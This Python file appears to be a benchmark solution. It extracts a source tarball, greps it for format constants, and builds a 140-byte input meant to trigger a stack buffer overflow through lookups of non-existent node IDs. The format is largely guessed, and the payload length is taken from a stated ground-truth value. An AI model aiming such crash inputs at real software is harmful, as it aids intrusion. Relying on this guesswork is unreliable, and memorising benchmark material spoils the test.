import os
import struct
import tempfile
import tarfile
import subprocess
from pathlib import Path
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for source files to understand the format
            source_root = Path(tmpdir)
            cpp_files = list(source_root.rglob("*.cpp")) + list(source_root.rglob("*.c"))
            h_files = list(source_root.rglob("*.h")) + list(source_root.rglob("*.hpp"))
            
            # Try to find relevant constants and structures
            magic = 0x4D454D53  # Default if not found (MEM S)
            version = 1
            node_id_offset = 0
            
            # Search for relevant patterns
            for file_path in cpp_files + h_files:
                try:
                    with open(file_path, 'r') as f:
                        content = f.read()
                        
                        # Look for magic number definitions
                        magic_match = re.search(r'MAGIC\s*=\s*0x([0-9A-Fa-f]+)', content)
                        if magic_match:
                            magic = int(magic_match.group(1), 16)
                            
                        # Look for version definitions
                        version_match = re.search(r'VERSION\s*=\s*(\d+)', content)
                        if version_match:
                            version = int(version_match.group(1))
                            
                        # Look for node_id_map or related structures
                        if 'node_id_map' in content:
                            # Try to understand the structure
                            struct_match = re.search(r'struct\s+(\w+)\s*\{[^}]*node_id\s*:\s*(\d+)[^}]*\}', content, re.DOTALL)
                            if struct_match:
                                node_id_offset = int(struct_match.group(2))
                                
                except:
                    continue
            
            # Construct the PoC based on analysis
            # We need to trigger stack buffer overflow by causing node_id_map lookup
            # with non-existent node IDs
            
            # Based on the ground-truth length of 140 bytes, we'll construct
            # a binary payload that should trigger the vulnerability
            
            # Common structure for such vulnerabilities:
            # 1. Header with magic and version
            # 2. Number of nodes
            # 3. Node data
            # 4. References to nodes (triggers the bug)
            
            # Build the payload
            payload = bytearray()
            
            # Header (assume 8 bytes)
            payload.extend(struct.pack('<I', magic))  # Magic
            payload.extend(struct.pack('<I', version))  # Version
            
            # Number of nodes (0 to trigger lookup failure)
            payload.extend(struct.pack('<I', 0))
            
            # Number of references (enough to trigger overflow)
            # We need to reference non-existent nodes
            num_refs = (140 - len(payload) - 4) // 4  # Calculate based on remaining bytes
            payload.extend(struct.pack('<I', num_refs))
            
            # Add references to non-existent nodes
            # Use increasing node IDs that won't exist
            for i in range(num_refs):
                payload.extend(struct.pack('<I', 0xFFFFFFFF - i))
            
            # Pad to exactly 140 bytes
            if len(payload) < 140:
                payload.extend(b'A' * (140 - len(payload)))
            elif len(payload) > 140:
                payload = payload[:140]
            
            return bytes(payload)